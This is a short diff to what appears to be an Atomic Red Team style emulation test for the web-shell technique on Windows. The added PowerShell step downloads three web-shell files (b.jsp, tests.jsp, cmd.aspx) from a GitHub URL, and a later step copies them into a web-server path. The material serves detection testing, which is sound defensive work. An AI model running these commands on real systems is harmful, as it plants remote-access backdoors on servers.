@@ -23,6 +23,15 @@ requirements:
     platforms:
         - os: windows
 steps:
+    - name: |
+        Web shell must exist on disk at specified location (#{web_shells})
+      inline: |
+        if (Test-Path "#{web_shells}") {exit 0} else {{New-Item -Type Directory "#{web_shells}" -ErrorAction ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/b.jsp" -OutFile "#{web_shells}/b.jsp"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/tests.jsp" -OutFile "#{web_shells}/tests.jsp"
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1505.003/src/cmd.aspx" -OutFile "#{web_shells}/cmd.aspx"
+        }}
+      executor: powershell
     - name: web-shell-written-to-disk
       inline: |
         xcopy /I /Y "{{.Args.web_shells}}" {{.Args.web_shell_path}}
